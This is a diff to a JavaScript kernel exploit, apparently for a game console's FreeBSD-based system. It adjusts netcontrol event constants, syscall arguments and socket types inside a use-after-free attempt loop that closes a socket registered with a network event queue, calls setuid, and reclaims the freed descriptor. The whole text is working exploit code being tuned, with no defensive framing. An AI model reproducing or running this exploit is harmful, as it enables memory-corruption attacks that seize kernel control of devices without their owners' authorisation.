@@ -67,8 +67,8 @@ const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
 
               ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
 
-const NETEVENT_SET_QUEUE   = new int64(0, 0x10);
-const NETEVENT_CLEAR_QUEUE = new int64(0, 0x8);
+const NETEVENT_SET_QUEUE   = 0x20000003;
+const NETEVENT_CLEAR_QUEUE = 0x20000007;
 
 const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
 const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
@@ -436,7 +436,7 @@ let allDone = false;
         // NETCONTROL: a1=0, a4=4, eventos int64
         function netevent(sock, event) {
             argDv.setUint32(0, sock >>> 0, true);
-            const r = sc(SYS.netcontrol, 0, event, argAddr, 4).i32;   // ← netcontrol, a1=0
+            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;   // ← netcontrol, a1=0
             return { rv: r, err: r === -1 ? errno() : 0 };
         }
 
@@ -775,7 +775,7 @@ let allDone = false;
             }
             state("attempt " + attempt + "...", "warn");
 
-            const dummy = sc(SYS.socket, 2 /* AF_INET */, SOCK_STREAM, 0).i32;
+            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT + " dummy=" + dummy);
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
             const reg = netevent(dummy, NETEVENT_SET_QUEUE);
@@ -786,7 +786,7 @@ let allDone = false;
 
             sc(SYS.close, dummy);
             sc(SYS.setuid, 1);
-            uafSock = sc(SYS.socket, 2 /* AF_INET */, SOCK_STREAM, 0).i32;
+            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
             if (uafSock !== dummy) {
                 mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                     + " got " + uafSock);
